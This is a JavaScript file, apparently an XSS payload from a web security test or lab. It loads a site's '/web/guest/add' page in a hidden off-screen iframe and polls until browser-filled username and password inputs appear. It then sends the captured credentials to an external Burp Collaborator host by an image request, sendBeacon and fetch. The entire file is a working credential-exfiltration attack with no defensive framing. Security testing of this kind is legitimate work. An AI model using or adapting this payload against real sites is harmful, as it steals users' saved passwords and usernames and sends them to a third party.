// life3.js - Reliable password extraction
(function() {
    function extractPassword() {
        var iframe = document.createElement('iframe');
        iframe.src = '/web/guest/add';
        iframe.style.position = 'absolute';
        iframe.style.left = '-9999px';
        iframe.style.width = '1px';
        iframe.style.height = '1px';
        document.body.appendChild(iframe);
        
        iframe.onload = function() {
            var attempts = 0;
            var maxAttempts = 30; // Try for 30 seconds
            
            var pollForPassword = setInterval(function() {
                attempts++;
                
                try {
                    var iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
                    
                    if (!iframeDoc || iframeDoc.readyState !== 'complete') {
                        return; // Keep waiting
                    }
                    
                    var pwdInput = iframeDoc.querySelector('input[name="fake_password"]');
                    var userInput = iframeDoc.querySelector('input[name="fake_username"]');
                    
                    if (!pwdInput || !userInput) {
                        if (attempts >= maxAttempts) {
                            clearInterval(pollForPassword);
                            alert('Failed: Password inputs not found');
                        }
                        return;
                    }
                    
                    var password = pwdInput.value || pwdInput.getAttribute('value') || '';
                    var username = userInput.value || userInput.getAttribute('value') || '';
                    
                    if (password && password.length > 0) {
                        clearInterval(pollForPassword);
                        
                        // Send to Burp Collaborator
                        var collab = 'https://m9wvitwtgk19gvfaojwmvuxw7nde15pu.oastify.com';
                        var payload = '/?user=' + encodeURIComponent(username) + '&pwd=' + encodeURIComponent(password);
                        
                        // Method 1: Image (most reliable, bypasses CORS)
                        var img1 = new Image();
                        img1.src = collab + payload;
                        document.body.appendChild(img1);
                        
                        // Method 2: Navigator.sendBeacon (reliable for logging)
                        if (navigator.sendBeacon) {
                            navigator.sendBeacon(collab + payload);
                        }
                        
                        // Method 3: Fetch (try but ignore errors)
                        fetch(collab + payload).catch(function(){});
                        
                        // Show single alert with all info
                        alert('Password: ' + password + '\n\nSent to Burp Collaborator!\n\nCheck: ' + collab);
                        
                        // Cleanup
                        if (iframe.parentNode) {
                            iframe.parentNode.removeChild(iframe);
                        }
                    } else if (attempts >= maxAttempts) {
                        clearInterval(pollForPassword);
                        alert('Timeout: Password field empty after ' + maxAttempts + ' seconds');
                    }
                    
                } catch(e) {
                    if (attempts >= maxAttempts) {
                        clearInterval(pollForPassword);
                        alert('Error: ' + e.message);
                    }
                }
            }, 1000); // Check every second
        };
        
        iframe.onerror = function() {
            alert('Failed to load password page');
        };
    }
    
    // Ensure DOM is ready
    if (document.body) {
        extractPassword();
    } else if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', extractPassword);
    } else {
        window.addEventListener('load', extractPassword);
    }
})();
